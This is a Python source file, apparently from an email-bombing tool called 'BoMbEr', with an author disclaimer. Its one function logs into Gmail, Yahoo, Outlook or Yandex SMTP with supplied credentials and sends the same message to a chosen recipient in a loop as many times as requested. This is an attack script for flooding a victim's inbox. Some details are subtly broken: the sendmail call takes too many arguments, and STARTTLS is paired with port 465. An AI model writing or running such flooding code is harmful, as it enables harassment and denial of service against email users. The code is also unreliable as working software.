# -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#-------------------------------------(email)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import fnmatch
import smtplib
import os.path
import asyncio
import platform
import requests
import colorama
import datetime
import threading
import user_agent
import progressbar
from time import sleep
from sys import platform
from telega import telega
from asyncio import sleep
from getpass import getpass
from os import name, system
from threading import Thread
from functools import reduce
from requests import get, post
from os.path import exists, isfile
from random import choice, randint
from colorama import Fore, Back, Style, init

def email(emails, passwords, to, amount, subj, mes, server):
	if server == '1':
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
	elif server == '2':
		server = smtplib.SMTP('smtp.mail.yahoo.com', 465)
		server.starttls()
	elif server == '3':
		server = smtplib.SMTP('smtp-mail.outlook.com', 587)
		server.starttls()
	elif server == '4':
		server = smtplib.SMTP('smtp.yandex.ru', 465)
		server.starttls()
	
	server.login(emails, passwords)

	for i in range(amount):
		server.sendmail(emails, to, subj, mes)